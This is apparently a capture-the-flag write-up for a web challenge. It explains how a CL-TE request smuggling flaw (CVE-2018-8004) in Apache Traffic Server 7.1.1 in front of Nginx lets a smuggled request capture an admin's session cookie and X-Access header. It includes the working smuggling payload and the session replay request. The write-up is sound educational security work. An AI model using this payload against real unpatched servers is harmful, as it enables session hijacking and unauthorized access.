Port 33337 [Web]
In the Server response header, we could see that the Apache Traffic Server (ATS) 7.1.1 was used,
This is vulnerable to CVE-2018-8004, a request smuggling vulnerability, and I came across a nice writeup here. The relevant patch we are looking at is here - a lack of validation for Content-Length headers.
In the vulnerable version, even if the Transfer-Encoding header exists, the Content-Length header is used. This leads to a request smuggling vulnerability if the backend server processes the Transfer-Encoding header instead of the Content-Length header to decide where the request ends.

It was observed that whenever a request is made to /save.php, an entry is appended to a "log file", which contains the cookies and the value of the X-Access header.
Assuming that an admin visits the site, we could use a CL-TE request smuggling attack to direct the admin to /save.php.
Consider the following payload:
```http
GET / HTTP/1.1
Host: threeofhearts.ctf.net
Content-Length: 30
Transfer-Encoding: chunked
0
GET /save.php HTTP/1.1
```
The ATS server processes the Content-Length header, and thus forwards the entire payload as a single request to the Nginx backend. 
However, Nginx sees the Transfer-Encoding header and decides that the first request ends early. This is a full, complete request.
http
GET / HTTP/1.1
Host: threeofhearts.ctf.net
Content-Length: 30
Transfer-Encoding: chunked

This is then followed by a second request, which is not yet completed.
http
GET /save.php HTTP/1.1

When the admin visits the site (the third request), his request is appended to the above incomplete request - the second and third request thus are processed as one single request.
```http
GET /save.php HTTP/1.1
...
Cookie: 
X-Access: 
```
Crucially, this request contains the admin's Cookie and X-Access headers.
In the log file, we can view the cookie:

Params:
Headers:
    X-Access: private
    Cookie: PHPSESSID=8m9k6s84bmdf270tbi81bpacc7

Then, visit private.php to view the flag.
http
GET /private.php HTTP/1.1
Host: threeofhearts.ctf.net
X-Access: private
Cookie: PHPSESSID=8m9k6s84bmdf270tbi81bpacc7
